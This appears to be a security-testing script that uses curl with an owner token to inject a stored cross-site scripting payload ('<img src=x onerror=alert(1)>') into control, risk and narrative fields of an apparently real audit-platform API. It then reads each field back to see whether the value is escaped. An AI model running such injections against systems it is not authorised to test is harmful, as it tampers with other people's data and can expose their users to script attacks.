import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
T=open('/tmp/bac_OWNER').read().strip()
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+(tok or T),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='zx'+uuid.uuid4().hex[:6]
PAY=f'<img src=x onerror=alert(1)>ZX{tag}'
print(f"payload: {PAY}\n")
print("=== inject into writable fields, then read back RAW ===")
cases=[
 ('controls',1,'control','name'),
 ('controls',1,'control','description'),
 ('risks',1,'risk','name'),
 ('narratives',31,'narrative','name'),
 ('narratives',31,'narrative','description'),
]
for plural,rid,key,field in cases:
    c,b=req('PUT',f'/api/v1/{plural}/{rid}',{key:{field:PAY}})
    c2,b2=req('GET',f'/api/v1/{plural}/{rid}')
    raw = PAY in b2
    escaped = '&lt;img' in b2 or '\\u003c' in b2
    print(f"  {plural}/{rid}.{field:12} PUT={c} readback_raw={raw} escaped={escaped}")
    if raw:
        # show the exact stored value
        try:
            arr=json.loads(b2).get(plural) or []
            print(f"      stored: {arr[0].get(field)!r}")
        except: pass
